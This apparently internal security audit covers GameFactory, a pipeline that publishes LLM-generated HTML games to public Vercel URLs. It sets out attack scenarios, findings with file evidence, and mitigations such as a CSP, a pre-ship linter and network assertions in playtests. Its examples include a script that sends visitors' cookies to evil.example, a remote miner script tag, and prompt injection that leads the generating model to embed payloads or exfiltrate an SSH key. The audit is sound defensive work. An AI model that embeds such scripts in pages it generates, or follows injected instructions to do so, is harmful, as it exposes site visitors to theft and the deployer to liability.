# SEC #8 — Output Safety (P0)

Scope: LLM-generated `games/<name>/index.html` → `gf ship` → public Vercel URL. Three live demos already published.

## Threat Model

The generated `index.html` is:
- authored by the LLM with zero human review,
- ships as a single HTML file with inline `<script>` and CSS,
- deployed to `https://gamefactory-<name>-*.vercel.app` (publicly accessible),
- served from `skywalker2506s-projects` Vercel scope — a reputation-bearing account,
- loaded by any visitor's browser with the Vercel origin (not sandboxed).

End users who visit the game URL trust "musab's Vercel site". They have no way to know a given page is LLM-output or whether a prompt-injection attack (SEC #3) caused the LLM to embed malicious payloads.

## Attack Scenarios

### A8.1 XSS against the game's own visitors — P0 (low severity per visitor but scalable)
The "game" is just HTML+JS. Nothing in GameFactory checks what the JS does. Injected prompt → LLM embeds:
```html
<script>
  fetch('https://evil.example/c?c='+encodeURIComponent(document.cookie))
  // scrape localStorage, keyboard, clipboard
</script>
```
Because the page is served from a `*.vercel.app` origin that the user trusts, cookies set by other apps on vercel.app are NOT accessible (origin isolation), but:
- Any visitor habit on that Vercel URL (localStorage, IndexedDB) is harvestable.
- Drive-by cryptominer (WASM miner) runs while the tab is open.
- Phishing overlay mimics a login page, harvests credentials.
- Redirects to a malicious site after X seconds.

### A8.2 Coin miner embedded — P1
A prompt-injection payload (even indirect, via a shared GAME.md template) adds `<script src="https://miner.example/wasm-miner.js"></script>`. End users burn CPU; developer's Vercel bandwidth gets billed.

### A8.3 Data collection / GDPR liability — P1
The LLM, helpfully, adds analytics: `<script src="https://www.googletagmanager.com/gtm.js?id=GTM-ATTACKER"></script>`. All visitors are now profiled. No consent banner; in EU this is a legal liability for the deployer.

### A8.4 Reputation attack — P1
Injection causes LLM to embed offensive content (racist slur, illegal imagery reference). Published under `skywalker2506s-projects`. Author's Vercel account faces ToS action and reputational damage. Recovery difficult (cached pages, archives).

### A8.5 Secret exfil embedded in HTML — P0
From SEC #3/A3.1 — base64-encoded SSH key as a data attribute. The developer's secrets are now served at a public URL until noticed.

## Findings

### F8.1 No content filter between LLM output and `gf ship` — P0
- Evidence: `scripts/gf:82-93`. No scan, no regex, no external URL allowlist, no CSP injection.
- Fix: post-process `index.html` before ship:
  - parse HTML, extract all `<script src>` and `fetch/XHR` URLs, warn on any not in an allowlist;
  - detect suspicious patterns: base64 blobs >200 chars, `document.cookie` references, `crypto.subtle` + WebSocket combos (miner), known miner domains;
  - inject a strict `Content-Security-Policy` meta tag that denies remote scripts/connects unless whitelisted.

### F8.2 No CSP on deployed output — P0
- Evidence: Vercel deploy pushes the HTML as-is. No `vercel.json` template with security headers.
- Fix: template a `vercel.json` inside `gf ship` that sets `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self'; img-src 'self' data:;` and `X-Frame-Options: DENY`.

### F8.3 Deploys go under shared Vercel scope — P1
- Evidence: `scripts/gf:92`: `--scope skywalker2506s-projects`. One malicious output under a shared scope affects all other deployments' reputation. No per-game isolation at the Vercel account level (projects are isolated, scope is not).
- Fix: dedicated `gamefactory-sandbox` scope; move known-good games out manually.

### F8.4 `gh repo create --public` makes source inspectable — mixed P1
- Pro: visitors can inspect the source (harder to hide malware long-term).
- Con: if exfil succeeds, code is self-incriminating evidence; also public repo makes it findable by automated scrapers that then cache the malicious code.
- Fix: default private; public only after human review (covered in SEC #6 F6.4).

### F8.5 No re-playtest after iterate — P1
- Evidence: `gf iterate` (scripts/gf:76-81) runs but doesn't require a re-playtest pass before next ship.
- Fix: `gf ship` requires a passing `gf playtest` artifact newer than `index.html` mtime.

### F8.6 Playtest.mjs does not validate absence of external fetches — P1
- Evidence: `playtest.mjs:34-37` captures `console.error` but doesn't track `page.on('request')` for unexpected external URLs. Playtest passes a page that beacons secrets.
- Fix: block `route('**')` for any origin not on an allowlist; fail playtest on network.

## Severity Summary

| ID | Finding | Severity |
|---|---|---|
| F8.1 | No content-safety filter before ship | P0 |
| F8.2 | No CSP on deployed output | P0 |
| F8.5 | No re-playtest gate | P1 |
| F8.3 | Shared Vercel scope | P1 |
| F8.6 | Playtest allows outbound fetches | P1 |
| F8.4 | Public repo default | P1 |

## Mitigations

1. **Pre-ship linter** — parse HTML, enforce:
   - no inline data attrs > 256 chars of base64/hex;
   - no `<script src>` to domain outside allowlist;
   - no `fetch`/`WebSocket`/`navigator.sendBeacon` to non-allowlist hosts;
   - no `eval`, `new Function`, `document.write` with remote input;
   - total HTML size sanity (<2 MB);
   - must parse; must have `<title>`.
2. **CSP header** via templated `vercel.json`.
3. **Playwright network assertion** — block external requests during playtest; fail if any occur.
4. **`gf ship --review`** — shows diff + URL allowlist summary; requires y/N confirmation.
5. Separate Vercel scope.
6. Default private GitHub repo.

Effort: 2–3 days for the linter + CSP + playtest-network-assertion. Scope/visibility changes trivial.

## Post-Mitigation Residual Risk

Even with linters, a sufficiently clever prompt injection could encode exfil via the allowlisted provider (e.g. use Google Fonts URL params to pack data). Complete defense requires either (a) human review every ship, or (b) LLM-based safety scanner as second pass.
